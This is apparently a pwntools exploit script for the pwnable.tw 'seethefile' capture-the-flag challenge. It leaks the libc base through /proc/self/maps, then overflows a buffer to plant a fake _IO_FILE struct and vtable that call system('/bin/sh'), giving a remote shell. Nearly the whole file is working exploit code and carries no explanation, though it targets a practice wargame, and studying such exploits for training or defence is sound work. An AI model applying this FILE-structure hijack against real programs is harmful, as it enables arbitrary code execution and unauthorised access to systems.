from os import system
from pwn import *
p = remote('chall.pwnable.tw', 10200)

# p = process('./seethefile', env={"LD_PRELOAD":"libc_32.so.6"})
# context.terminal = ['tmux','splitw','-h']
# gdb.attach(proc.pidof(p)[0],gdbscript="b *0x8048b0f")
elf = ELF('./seethefile')
libc = ELF('./libc_32.so.6')

name_bss = 0x0804b260
system_ptr = name_bss + 28

def open_file(path):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", path)

def readfile():
    p.sendlineafter(":", "2")

def writefile():
    p.sendlineafter(":", "3")

def closefile():
    p.recvuntil('choice :')
    p.sendline("4")

def exit(name):
    p.sendlineafter(":", "5")
    p.sendlineafter(":", name)

def solve():
    open_file('/proc/self/maps')            # leak libc
    readfile()
    readfile()
    writefile()
    p.recvuntil('\n')
    
    libc.address = int(p.recv(8),16)
    system_addr = libc.symbols['system']

    log.info("libc base leak:%s" %hex(libc.address))
    log.info("system leak:%s" %hex(system_addr))

    # _IO_FILE_plus
    _fake_struct = '/bin/sh\x00' # 8        # flag
    _fake_struct += p32(0) * 16 
    _fake_struct += p32(name_bss)           # bypass check with null
    _fake_struct += p32(0) * 18             
    _fake_struct += p32(name_bss + 188)     # fake vtable address

    # _IO_file_jumps
    _fake_vtable = p32(0) * 17
    _fake_vtable += p32(libc.symbols['system'])

    payload = p32(0) * 8
    payload += p32(name_bss + 36)           # overflow fd pointer to _fake_struct
    payload += _fake_struct
    payload += _fake_vtable

    print hex(len(payload))
    exit(payload)
    p.interactive()

if __name__ == '__main__':
    solve()